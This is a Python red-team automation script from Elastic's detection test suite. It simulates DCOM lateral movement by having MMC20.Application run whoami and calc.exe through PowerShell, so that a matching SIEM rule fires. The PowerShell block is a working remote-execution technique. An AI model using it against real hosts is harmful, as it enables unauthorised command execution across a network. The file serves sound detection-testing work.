# Copyright Elasticsearch B.V. and/or licensed to Elasticsearch B.V. under one
# or more contributor license agreements. Licensed under the Elastic License
# 2.0; you may not use this file except in compliance with the Elastic License
# 2.0.

# Name: DCOM Lateral Movement with MMC
# RTA: dcom_lateral_movement_with_mmc.py
# ATT&CK: T1175
# Description: Execute a command to simulate lateral movement using Distributed Component Object Model (DCOM) with MMC


import logging

from . import OSType, RuleMetadata, _common, register_code_rta

log = logging.getLogger(__name__)


@register_code_rta(
    id="7f4cfcf6-881b-48b0-864d-21eba06e57cc",
    name="dcom_lateral_movement_with_mmc",
    platforms=[OSType.WINDOWS],
    endpoint_rules=[],
    siem_rules=[
        RuleMetadata(id="51ce96fb-9e52-4dad-b0ba-99b54440fc9a", name="Incoming DCOM Lateral Movement with MMC")
    ],
    techniques=["T1021"],
)
def main():
    remote_host = _common.get_host_ip()
    log.info("DCOM Lateral Movement with MMC")

    log.info("Attempting to move laterally to {}".format(remote_host))
    remote_host = _common.resolve_hostname(remote_host)
    log.info("Using IP address {}".format(remote_host))

    # Prepare PowerShell command for DCOM lateral movement

    ps_command = """
    $dcom=[activator]::CreateInstance([type]::GetTypeFromProgID('MMC20.Application','{remote_host}'));
    $dcom.Document.ActiveView.ExecuteShellCommand('C:\\Windows\\System32\\cmd.exe',$null,'whoami','7');
    $dcom.Document.ActiveView.ExecuteShellCommand('C:\\Windows\\System32\\calc.exe',$null,$null,'7');
    $dcom.quit();
    """.format(
        remote_host=remote_host
    )

    command = ["powershell", "-c", ps_command]

    # Execute command
    _ = _common.execute_command(command, timeout_secs=15)
